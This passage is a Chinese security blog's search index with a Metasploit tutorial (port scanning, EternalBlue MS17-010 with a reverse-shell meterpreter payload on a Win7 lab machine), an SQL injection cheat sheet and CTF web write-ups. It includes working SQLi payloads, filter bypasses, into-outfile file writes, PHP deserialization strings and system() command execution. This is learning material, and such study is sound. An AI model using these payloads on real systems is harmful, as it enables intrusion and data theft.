<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>metasploit学习与使用</title>
    <url>/2021/05/24/metasploit/</url>
    <content><![CDATA[<p>metasploit的学习与使用</p>
<span id="more"></span>
<hr>
<p><strong><em>metasploit简介</em></strong><br>     metasploit(Metasploit Framework)是一款开源的安全漏洞检测工具，它是完全颠覆了已有的渗透测试方式。几乎所有的流行操作系统都支持Metasploit。<br>  <a href="https://github.com/rapid7/metasploit-framework">metasploit下载地址</a>，kali里面预装了metasploit。在终端输入msfconsole即可使用。<br><strong><em>metasploit模块介绍</em></strong><br>   <img data-src="001.png" alt="图片"></p>
<table>
<thead>
<tr>
<th align="center">模块</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">auxiliary</td>
<td align="center">辅助模块，不会与目标机建立连接，主要用于收集信息。如，嗅探，指纹识别，扫描端口等</td>
</tr>
<tr>
<td align="center">exploit</td>
<td align="center">漏洞利用模块，利用系统或应用漏洞进行攻击。</td>
</tr>
<tr>
<td align="center">payload</td>
<td align="center">攻击载荷模块，期望目标系统在被渗透攻击之后完成实际功能的代码</td>
</tr>
<tr>
<td align="center">post</td>
<td align="center">后期渗透模块，在获取目标系统控制权之后进行一系列的后渗透攻击。如:获取敏感信息等</td>
</tr>
<tr>
<td align="center">encode</td>
<td align="center">编码模块，对攻击载荷进行免杀处理防止被防火墙发现，避免在渗透过程中出现‘坏字符’</td>
</tr>
<tr>
<td align="center">nops</td>
<td align="center">空指令模块，对运行程序不会造成任何实质影响的空操作或无关操作指令。如:show nops.</td>
</tr>
</tbody></table>
<hr>
<p>   POC验证程序:当互联网暴露出高危漏洞或挖出0day，为了了解漏洞的影响面，这时候就需要POC批量验证。</p>
<h5 id="跳板攻击"><a href="#跳板攻击" class="headerlink" title="跳板攻击"></a>跳板攻击</h5><p>   跳板攻击:攻击者通过控制N个主机向目标机进行攻击。跳板攻击分为两类：</p>
<ul>
<li>中继型跳板:这类不会对攻击者发送的包进行更改，容易被追踪发现。</li>
<li>控制型跳板:这类会对攻击者发送的包进行改变，不容易被追踪<br>但不论容不容易还是什么目的，在未得对方许可授权下不要对任何网站或个人进行攻击。</li>
</ul>
<p><strong><em>metasploit渗透攻击步骤</em></strong><br>   简要的说明下</p>
<ul>
<li>找寻可利用的漏洞</li>
<li>选择漏洞利用模块</li>
<li>配置攻击载荷</li>
<li>选择编码技术</li>
<li>开始攻击<br><strong><em>metasploit模块的使用</em></strong><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5>这里使用search scanner/port查找可以用模块。如图：<br><img data-src="002.png" alt="图片"><br>这里使用模块4.使用 use auxiliary/scanner/portscan/tcp 使用辅助模块。这个模块是基于tcp扫描的。<br><img data-src="003.png" alt="图片"><table>
<thead>
<tr>
<th align="center">扫描方式</th>
<th align="center">原理</th>
</tr>
</thead>
<tbody><tr>
<td align="center">portmap_amp</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ack</td>
<td align="center">通过ACK扫描方式对防火墙上未关闭的端口进行探测</td>
</tr>
<tr>
<td align="center">ftpbounce</td>
<td align="center">通过ftp bounce攻击对的原理对TCP服务进行枚举</td>
</tr>
<tr>
<td align="center">syn</td>
<td align="center">通过发送TCP SYN标志的方式探测开放的端口</td>
</tr>
<tr>
<td align="center">tcp</td>
<td align="center">通过一次完整的TCP连接来判断端口是否开放，这种方式是最准确的，但是速度很慢</td>
</tr>
<tr>
<td align="center">xmas</td>
<td align="center">一种更为隐蔽的扫描方式，通过发送FIN.PSH和URG标志能够躲过一些高级TCP标记检测器的过滤</td>
</tr>
</tbody></table>
</li>
</ul>
<hr>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>   输入info查看模块配置信息<br>   <img data-src="004.png" alt="图片"><br>   yes为必须输入，不可空缺。这里只需要设置RHOSTS(目标地址)使用set RHOSTS PATH，set PORTS number-number(探测的端口)。<br>   设置完后可以使用show options查看刚才的配置。<br>   使用exploit或者run运行模块。<br>   <img data-src="005.png" alt="图片"><br>   这里可以只扫描了1-10000的端口。<br>   端口状态有三种</p>
<ul>
<li>open:开放</li>
<li>filter:过滤</li>
<li>close:关闭<br>同时metasploit矿架中也内置了nmap接口,也可以使用nmap进行扫描<br><img data-src="006.png" alt="图片"><br>nmap扫描有个好处，他显示对应端口的服务信息。你可以根据对应端口的服务信息来找寻漏洞。<br><strong><em>攻击演练</em></strong><h6 id="攻击演练"><a href="#攻击演练" class="headerlink" title="攻击演练"></a>攻击演练</h6>这里使用的靶机是win7专业版,攻击机是kali。主要漏洞利用的就是2017年暴露的是微软一个漏洞(MS17-010)有个非常好听的名字叫”永恒之蓝”。<br>想要了解他更多的故事点击<a href="https://zhuanlan.zhihu.com/p/35249719">永恒之蓝</a>。<br>metasploit框架已经有了MS17-010的exploit这里直接使用即可。<br><img data-src="007.png" alt="图片"><br>我们使用第8个exploit。<br><img data-src="008.png" alt="图片"><br>可以看到这个模块默认配置了一个payload(windows/x64/meterpreter/reverse_tcp)。这个payload的作用就是在exploit利用漏洞对目标进行攻击之后，目标机会反弹<br>一个shell连接到我们的主机。建立一个meterpreter会话。如图：<br><img data-src="009.png" alt="图片"><br>可以看到建立成功。接下来就可以使用一些命令来对目标系统进行操作已达到我们的目的。</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入总结</title>
    <url>/2021/05/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>sql注入总结<br>sql算是接触的比较早的了，学习了之后也一直没有总结，今天就算是记录下</p>
<span id="more"></span>
<hr>
<h3 id="sql函数介绍"><a href="#sql函数介绍" class="headerlink" title="sql函数介绍"></a>sql函数介绍</h3><p>   增：insert into table values(‘列名’,’列名’,’列名’)</p>
<p>   改：update table set 列名=’xxx’ where 条件</p>
<p>   删：delete from table where 条件</p>
<h3 id="关键字介绍"><a href="#关键字介绍" class="headerlink" title="关键字介绍"></a>关键字介绍</h3><table>
<thead>
<tr>
<th align="center">关键字</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">@@version</td>
<td align="center">查看数据库版本信息</td>
</tr>
<tr>
<td align="center">@@basedir</td>
<td align="center">查看数据库路径</td>
</tr>
<tr>
<td align="center">database()</td>
<td align="center">查看当前数据库</td>
</tr>
<tr>
<td align="center">user()</td>
<td align="center">查看数据库当前用户</td>
</tr>
<tr>
<td align="center">@@version_compile_os</td>
<td align="center">操作系统版本</td>
</tr>
<tr>
<td align="center">*    获取这些信息对我们后面的渗透有作用，毕竟信息越多，渗透成功的可能性越大。</td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍***"></a>函数介绍***</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">length()</td>
<td align="center">判断字符长度</td>
</tr>
<tr>
<td align="center">if(a,b,c)</td>
<td align="center">如果a正确，则执行b否则执行c</td>
</tr>
<tr>
<td align="center">concat</td>
<td align="center">将多个字符串谅解为一个字符串，无符号</td>
</tr>
<tr>
<td align="center">concat_ws</td>
<td align="center">以特定符号链接字符串</td>
</tr>
<tr>
<td align="center">group_concat</td>
<td align="center">将产生同一分组的值连接起来</td>
</tr>
<tr>
<td align="center">left(str,a)</td>
<td align="center">从左侧截取字符串的前a位</td>
</tr>
<tr>
<td align="center">substr(a,b,c)</td>
<td align="center">从b位置开始截取a字符串的第c位</td>
</tr>
<tr>
<td align="center">substring</td>
<td align="center">同substr</td>
</tr>
<tr>
<td align="center">mid(a from b for c)</td>
<td align="center">同substr函数,如果‘,’被过滤，可以使用这种写法</td>
</tr>
<tr>
<td align="center">ascii(str)</td>
<td align="center">将某个字符转换为ascii值</td>
</tr>
<tr>
<td align="center">ord(str)</td>
<td align="center">同ascii函数</td>
</tr>
<tr>
<td align="center">IFNULL(a,b)</td>
<td align="center">第一个参数为NULL就返回b.</td>
</tr>
<tr>
<td align="center">CAST(a as b)</td>
<td align="center">将a转换为b类型，b不能为自己定义的类型</td>
</tr>
</tbody></table>
<p>   示例：</p>
<ul>
<li><p>select concat(id,username,password) from user。  将user表中id,username,password连接起来输出。</p>
</li>
<li><p>group_concat常于group by使用，用于将group by产生的相同的分组联合起来，如select group_concat(id) from user group by name。就是将user表中相同人名的id值连接起来。在sql注入中，select group_concat(table_name) where table_schema=database();你可以使用group_concat将当前数据库中所有表单的名字输出。</p>
<h3 id="基于报错的sql盲注"><a href="#基于报错的sql盲注" class="headerlink" title="基于报错的sql盲注"></a>基于报错的sql盲注</h3><p>count(),floor(),rand(),group by联合进行报错回显</p>
</li>
<li><p>rand()函数随机返回0<del>1之间的一个随机数，rand(0)固定返回0，rand()*2就是返回0</del>2之间的随机数。</p>
</li>
<li><p>floor()函数返回括等于或小于括号值的最大整数,当floor与rand(0)*2结合就会产生一个数列011011。</p>
</li>
<li><p>count()用于计数<br>报错原理：count()与group by结合起来，在进行计数时会先建立虚拟表，虚拟表有key代表主键，value代表数量。上面floor(rand(0)<em>2)产生了一个数列011011。rand函数在进行计数的时候会被多次计算,即插入key值不存在时会在计算一次floor(rand(0)*2),按照上面的数列，<br>第一次计算时为0,0不存在会插入虚拟表中,同时在进行计算一次，这时插入的就是key为1,value为1。在继续往下进行,这时就是第三<br>次计算，值为1，表中存在,直接插入，这时表中key为1 vallue为2。继续进行，rand进行第四次计算值为0,表中不存在，在计算一次，<br>值为1进行插入，但是已经存在1，key值不能重复,这时就会报错。<br>#简化的语句：select count(</em>) from information_schema.tables group by concat(database(),floor(rand(0)<em>2))<br>#关键表被禁用可以这样写:select count(</em>) from(select 1 union select null union select !1)a group by concat(database(),floor(rand(0)*2))</p>
<p>rand被禁用还可以这样写:select min(@a:=1) from information_schema.tables group by concat(user(),@a=(@a+1)%2)<br>利用xpath函数(extractvalue，updatevalue)进行报错注入</p>
</li>
<li><p>extractvalue(目标xml文档，xml路径)。在xml查找时路径格式应该为/a/b/c。如果写入其他格式就会报错。并且返回报错的内容。</p>
</li>
<li><p>updatexml(目标文档，xml路径，更新的内容)，报错同上。<br>#extractvalue(0x7e,concat(0x7e,((select count(<em>) from mysql.user)&lt;0)))–+<br>#or updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) or 1=’1<br>**</em>基于延时的sql盲注***<br>if,ascii,substr的结合使用</p>
</li>
<li><p>if(ascii(substr((slect user()),1,1))=num,1,sleep(num))</p>
</li>
<li><p>if(ORD(mid((select user()),1,1))=num,1,sleep(num))<br>#and if(ascii(substr((select user()),1,1))=80,1,sleep(5))–+</p>
<h3 id="sql注入关于文件"><a href="#sql注入关于文件" class="headerlink" title="sql注入关于文件"></a>sql注入关于文件</h3><p>向数据库中写入文件(into outfile)</p>
</li>
<li><p>简单的语句：union select 1,2,3 into outfile “文件路径记得转义斜杠” –+<br><strong><em>将数据库中的文件导出</em></strong></p>
</li>
<li><p>导出文件需要完全可读权限，而且文件必须存在在服务器上，路径的是绝对路径，文件大小必须小于max_allowed_packet</p>
</li>
<li><p>简单的语句union select 1,2,load_file(“path”) –+</p>
</li>
<li><p>联合起来： union select 1,2,load_file(“path”) into outfile “path” –+ 这个需要开启secure_file_prive=<br>#修改文件操作</p>
</li>
<li><p>union select 1,2,into outfile “path” lines terminated by xxxx</p>
<h3 id="sql注入关于转义函数"><a href="#sql注入关于转义函数" class="headerlink" title="sql注入关于转义函数"></a>sql注入关于转义函数</h3></li>
<li><p>php默认对所有提交的数据自动调用转义函数(addslashes())</p>
</li>
<li><p>受addslashes()函数影响的字符 “‘“,’”‘,”&quot;,”NULL”</p>
</li>
<li><p>受mysql_real_escape_string()函数影响的字符 “\x00”,”\n”,”\r”,”&quot;,”‘“,”””,”\x1a”</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">stripslashes()</td>
<td align="center">删除由addashles函数添加的反斜杠，也就是’\‘变为’&#39;,’&#39;‘变为’’’</td>
</tr>
<tr>
<td align="center">mysql_real_escape_string()</td>
<td align="center">函数转义sql使用字符串中的特殊字符,成功返回true</td>
</tr>
<tr>
<td align="center">get_magic_quotes_gpc()</td>
<td align="center">对提交的字符串进行检测是否转义，高版本已启用</td>
</tr>
<tr>
<td align="center">### sql注入关于过滤</td>
<td align="center"></td>
</tr>
</tbody></table>
</li>
<li><p>对于or/and的过滤 可以使用 双写 ‘/**/‘, &amp;&amp;或||,hex，urlencode编码来绕过</p>
</li>
<li><p>对于空格可以嵌套(),/**/或者用一些特殊字符替换,如：%09(TAB键),%0a(新的一行),%0c(新的一页),%0d(return),%0b(TAB垂直,windwos下可以解析),%a0(空格) </p>
<h3 id="sql关于宽字节注入"><a href="#sql关于宽字节注入" class="headerlink" title="sql关于宽字节注入"></a>sql关于宽字节注入</h3><p>#原理：</p>
</li>
<li><p>&#39;的url编码为%5c%27</p>
</li>
<li><p>mysql使用gbk编码会认为两个字符为一个汉字。如果过滤”‘“采用的是反斜杠转义,那么可以采用%df去与%5c结合绕过过滤。</p>
</li>
<li><p>简单的语句：-1%20%df%27union%20select%201,2,3–+;这种仅限于get型，如果是post则需要将utf-8的”‘“转换为utf-16,或者utf-32。</p>
<h3 id="sql关于order-by之后的注入"><a href="#sql关于order-by之后的注入" class="headerlink" title="sql关于order by之后的注入"></a>sql关于order by之后的注入</h3><p>#sql语句：select * from user order by xxx</p>
</li>
<li><p>order by注入是按照某一列进行排序，不能使用and 1=1来判断是否存在注入</p>
</li>
<li><p>简单的语句：?sort=(select count(<em>) from information_schema.columns group by concat(0x7e,(select user()),0x7e,floor(rand(0)</em>2)))–+</p>
</li>
<li><p>如果order by后面跟的是类似于id这种数值型参数，那么可以使用异或字符与正则匹配进行注入。如：?sort=异或(select(select user())regexp ‘异或xx’<br>   如果正则匹配返回正确,那么他会返回二进制数值的1与前面的数值进行异或，那么数据的排序就会乱掉不再是升序排序。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界</title>
    <url>/2021/05/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    <content><![CDATA[<p>攻防</p>
<span id="more"></span>
<hr>
<p><strong>**</strong>攻防世界**<br>1.<img data-src="https://img-blog.csdnimg.cn/20200708082834990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200708083159117.png" alt="在这里插入图片描述"><br><strong><em>WP</em></strong>：题目提示想想初始界面。一般的话初始界面的命名为index.php,这里可以试试。将1.php改为index.php.发现跳转的还是1.php.我们打开开发者模块选择网络模块再试一次。发现了flag.或者使用burp抓包查看回显也可以找到。<br><img data-src="https://img-blog.csdnimg.cn/20200708084057338.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200708084751184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.<img data-src="https://img-blog.csdnimg.cn/20200708084837551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">WP:这里提示我们robots.txt,我们可以在URL里输入试下。<br><img data-src="https://img-blog.csdnimg.cn/2020070808512427.png" alt="在这里插入图片描述">)<img data-src="https://img-blog.csdnimg.cn/20200708085319159.png" alt="在这里插入图片描述"><br>发现flag藏在fl0g.php,同样再次输入fl0g.php就可以找到flag.<br>3.<img data-src="https://img-blog.csdnimg.cn/20200708085905603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)WP:从题目看应该是文件包含。这里while语句过滤了php：<img data-src="https://img-blog.csdnimg.cn/20200708102725849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">但是这个过滤是可以使用大小写绕过。或者使用data://伪协议。<br><img data-src="https://img-blog.csdnimg.cn/20200708103625463.png" alt="在这里插入图片描述">)system():输出并返回最后一行shell结果。<br>exec():不输出直接返回。<br><img data-src="https://img-blog.csdnimg.cn/20200708104122611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)这里就可以看到flag存在的文件名称，在利用源码中show_source()函数就可以找到flag.<br>4.<img data-src="https://img-blog.csdnimg.cn/20200708104357840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)WP:根据题目提示砸门直接点击报表中心。<img data-src="https://img-blog.csdnimg.cn/20200708104453673.png" alt="在这里插入图片描述">点击确定没有任何变化，应该是没有写后端。观察url发现id比较奇怪直接用burp爆破id.发现当id为2333时他的length不同，直接修改id即可找到flag<br><img data-src="https://img-blog.csdnimg.cn/20200708105356131.png" alt="在这里插入图片描述">)5.<img data-src="https://img-blog.csdnimg.cn/20200708105446784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:这里我们打开题目后发现是个滑稽的表情，我们打开开发者界面发现<img data-src="https://img-blog.csdnimg.cn/2020070810555889.png" alt="在这里插入图片描述">咱们输入这个source.php.<br><img data-src="https://img-blog.csdnimg.cn/20200708105647775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">出现了代码。这个代码中除了source.php还有hint.php,再次输入发现<br><img data-src="https://img-blog.csdnimg.cn/20200708110545193.png" alt="在这里插入图片描述"><br>找到了flag存在的位置，再审查代码，这个代码的意思就是要让file存在并且还要是字符串还要过check函数。而在要过check函数就规定这个file要是$whitelist数组中的元素，还要是字符串。而且这个代码中还有截取<img data-src="https://img-blog.csdnimg.cn/20200708110209138.png" alt="在这里插入图片描述"><br>不能有问号，还要解码<img data-src="https://img-blog.csdnimg.cn/20200708110315139.png" alt="在这里插入图片描述"><br>接下来就是构造file的值就可找到flag.<img data-src="https://img-blog.csdnimg.cn/20200708110848839.png" alt="在这里插入图片描述"><br>1.<img data-src="https://img-blog.csdnimg.cn/20200717203900284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200717203927844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)WP：题目定义了一个demo类，首先包含构造函数，析构函数，和魔术方法（——wakeup()）当变量进行反序列化时回先执行wakeup函数,以及私有变量file。这里提示flag在fl4g.php之中，当实例销毁时会输出变量。再看下面GET传参var变量，变量经过base64解密，解密后经过正则表达式，若var变量存在o或者C不区分大小写输出stop hacking。否则进行发序列化。现在就是构造var变量的值。正则表达式可以采用+绕过，而wakeup在小于PHP7版本下可以通过实例值与对象值不相等绕过，再将fl4g.php进行序列化<br>O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}在进行base64加密即可得到flag.<br>2.<img data-src="https://img-blog.csdnimg.cn/20200717205451969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">/<br><img data-src="https://img-blog.csdnimg.cn/20200717205728637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">WP:打开题目发现是个搜索框猜测题目类型为sql注入。使用SQL语句’ and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #去得到表名。<br><img data-src="https://img-blog.csdnimg.cn/20200717210932499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="发现"><br>发现咱们需要的东西：secret_table。接下来去获取表单的内容’ and 0 union select 1,column_name,data_type from information_schema.columns where table_name=’secret_table’# 得到 secret_table。<br><img data-src="https://img-blog.csdnimg.cn/20200717211202256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="发现"><br>发现flag存在的位置以记名字。<br>‘ and 0 union select 1,2,fl4g from secret_table #去得到flag。上述’去闭合前一个’，#去闭合最后一个。<br>3.<img data-src="https://img-blog.csdnimg.cn/20200717211510728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="WP"><br>WP：这个题目是带一个附件的解压后是这样的<img data-src="https://img-blog.csdnimg.cn/2020071721164687.png!%5B%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0%5D(https://img-blog.csdnimg.cn/2020071721174890.png" alt="在这里插入图片描述"></p>
<p>发现是这样的，里面是js语句，这里咱们猜测改下后缀名为.html，打开后页面时<img data-src="https://img-blog.csdnimg.cn/2020071721191654.png" alt="在这里插入图片描述">咱们再看下代码发现后面有个eval函数，这里咱们改为alert（），让页面去弹出源代码<br><img data-src="https://img-blog.csdnimg.cn/2020071721214696.png" alt="在这里插入图片描述"><br>在这个代码中要根据特定的正则表达式去得到var变量的值，再输入到搜索框中即可得到flag.根据代码得知var变量要16位以beof开头98aa结尾中间包含233ac和e98aa这样得到var变量值即可得到flag.<br>4.<img data-src="https://img-blog.csdnimg.cn/20200717212650602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200717212701748.png" alt="在这里插入图片描述"><br>WP：这里我们打开题目发现一段英文，意思是你能得到这个真正的网站吗？咱们先输入index.php发现页面没有变化，再试试输入index.phps.发现<img data-src="https://img-blog.csdnimg.cn/20200717213020358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里要让id get传参后经过URLdecode不等于admin，第二要让admin等于id即可得到flag.这里代码进行了一次urldecode,再加上地址栏中一次总共两次，这里id 要满足两个条件必须url编码两次。即可得到flag。<br>5.<img data-src="https://img-blog.csdnimg.cn/20200717214151849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200717214326192.png" alt="在这里插入图片描述"><br>WP：这里看到wakeup猜测为反序列化问题，同上第二题绕过wakeup，传参给code即可。O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}<br><strong><em>1.flask模板下注入</em></strong><br><img data-src="https://img-blog.csdnimg.cn/20200731211712846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>这里打开题目后的界面是这样的<br><img data-src="https://img-blog.csdnimg.cn/20200731205718771.png" alt="在这里插入图片描述"><br>整理后<br><img data-src="https://img-blog.csdnimg.cn/20200731205747620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：这里用了flask在/shrine/下的SSTI，这里对小括号进行了替换并且将config与self拉入了黑名单。<br>这里根据他给的代码咱们构造payload</p>

<p>注：1.flask是python的web 框架。<br>2.处理URL到python函数映射关系的程序一般叫做路由(Router)<br>3.上面的payload利用了flask-ssti模板注入漏洞。<br>4.<a href="https://www.cnblogs.com/zaqzzz/p/10251892.html这个是关于这个模板注入的总结。">https://www.cnblogs.com/zaqzzz/p/10251892.html这个是关于这个模板注入的总结。</a><br><strong><em>2.文件包含漏洞</em></strong><br><img data-src="https://img-blog.csdnimg.cn/20200731212317461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731212331696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：题目已经给出了提示让让利用后门入侵系统，这里一系列的按钮只有设备维护可以打开<br><img data-src="https://img-blog.csdnimg.cn/20200731212555322.png" alt="在这里插入图片描述"><br>查看源码后发现<img data-src="https://img-blog.csdnimg.cn/20200731212804869.png" alt="在这里插入图片描述"><br>咱们试着输入<br><img data-src="https://img-blog.csdnimg.cn/20200731212836747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里咱们利用php伪协议中php://filter读取源码。发现<br><img data-src="https://img-blog.csdnimg.cn/20200731213049962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里将页面显示出来的用base64解密。<br><img data-src="https://img-blog.csdnimg.cn/202007312133193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里可以利用preg_replace漏洞，执行php语句。传入三个参数使用burp抓包修改传入的参数，使php代码执行。<br><img data-src="https://img-blog.csdnimg.cn/20200731214912537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现咱们测试的代码执行，接下来咱们使用system(“ls”)获取文件目录<br><img data-src="https://img-blog.csdnimg.cn/20200731215309708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来咱们使用system(“cd%20s3chahahaDir/flag%26%26+ls”)进入这个s3这个目录并且查看这个目录的文件。<br><img data-src="https://img-blog.csdnimg.cn/20200731215717611.png" alt="在这里插入图片描述"><br>发现目录下有个flag文件.继续查看得到flag.php.<br>3.<br><img data-src="https://img-blog.csdnimg.cn/2020073122120290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img 